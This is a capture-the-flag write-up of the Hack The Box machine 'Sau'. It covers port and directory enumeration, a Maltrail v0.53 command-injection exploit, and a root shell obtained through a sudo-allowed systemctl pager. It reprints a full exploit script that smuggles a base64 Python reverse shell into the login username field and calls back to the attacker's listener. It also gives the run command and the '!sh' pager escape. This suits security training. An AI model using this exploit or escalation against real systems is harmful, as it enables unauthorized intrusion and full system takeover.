---
title: "HTB - Sau"
categories: [box]
date: 2023-12-26
comments: true
image: /images/walkthroughs/hackthebox/sau/logo.png
favicon: /images/walkthroughs/hackthebox/sau/logo.png
description: HTB - Sau walkthrough
---

# Sau

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sau/banner.png" width="65%"/>
</p>


## Summary

Sau is an easy box, where we get a website running in port 55555. A deeper inspection with gobuster, reveals a /local path where we found a vulnerable software Maltrail v0.53. With the RCE vulnerability in the /login path, we land in the machine as _puma_ user.
For the privilege escalation, we run sudo -l to see that any user without password can run an specific command of systemctl. Using the pager of that command output, we can spawn a shell with root privileges to solve the box.

<br>

## Enumeration

- nmap 

```bash
nmap 10.10.11.224  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-26 12:45 CET
Nmap scan report for 10.10.11.224
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
```

We can see the port 55555 open, with a website, let's enumerate that:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/sau/1_1_basket.png" width="90%"/>
</p>


- gobuster

```bash
gobuster dir -u "http://10.10.11.224:55555" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.224:55555
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/12/26 12:16:42 Starting gobuster in directory enumeration mode
===============================================================
/2                    (Status: 200) [Size: 0]
/@                    (Status: 400) [Size: 75]
/Documents and Settings (Status: 400) [Size: 75]
/Program Files        (Status: 400) [Size: 75]
/a                    (Status: 200) [Size: 0]
/admin                (Status: 200) [Size: 0]
/baskets              (Status: 401) [Size: 0]
Progress: 1775 / 4714 (37.65%)[ERROR] 2023/12/26 12:16:55 [!] Get "http://10.10.11.224:55555/abc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/foo                  (Status: 200) [Size: 0]
/g                    (Status: 200) [Size: 0]
/guest                (Status: 200) [Size: 0]
/hacker               (Status: 200) [Size: 0]
/hack                 (Status: 200) [Size: 0]
/hi                   (Status: 200) [Size: 0]
/local                (Status: 200) [Size: 7091]
/lost+found           (Status: 400) [Size: 75]
/master               (Status: 200) [Size: 0]
/prueba               (Status: 200) [Size: 0]
/reports list         (Status: 400) [Size: 75]
/so                   (Status: 200) [Size: 7091]
/ss                   (Status: 200) [Size: 0]
/root                 (Status: 401) [Size: 12]
/test                 (Status: 200) [Size: 0]
/test1                (Status: 200) [Size: 0]
/testing              (Status: 200) [Size: 0]
/web                  (Status: 200) [Size: 8700]

```

<br>

We can see an interesting path on /local, /so, /web. Checking the /local, we can see a software called **Maltrail v0.53**. A quick lookup on Google will display a RCE vulnerability with a [POC](https://github.com/spookier/Maltrail-v0.53-Exploit).


<p align="center">
  <img src="/images/walkthroughs/hackthebox/sau/1_2_local.png" width="80%"/>
</p>


Exploit from [https://github.com/spookier/Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit).

```python
'''
  ██████  ██▓███   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████  ██▀███  
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▓██ █▄ ░██░▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░     ░░   ░ 
      ░               ░ ░      ░ ░  ░  ░    ░     ░  ░   ░     
'''

import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

<br>

To run the exploit:

```bash
python3 exploit.py 10.10.14.80 5454 http://10.10.11.224:55555/local
```

<br>

With our **nc** listening in port 5454, we get the revshell and the user flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sau/2_0_in.png" width="95%"/>
</p>


<p align="center">
  <img src="/images/walkthroughs/hackthebox/sau/2_1_user.png" width="55%"/>
</p>


## Privesc

A quick sudo -l will reveal a possible privesc path:

```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
$ 
```

Using the pager of the command, we can run _!sh_ to spawn a shell as root and get the flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sau/3_1_root.png" width="70%"/>
</p>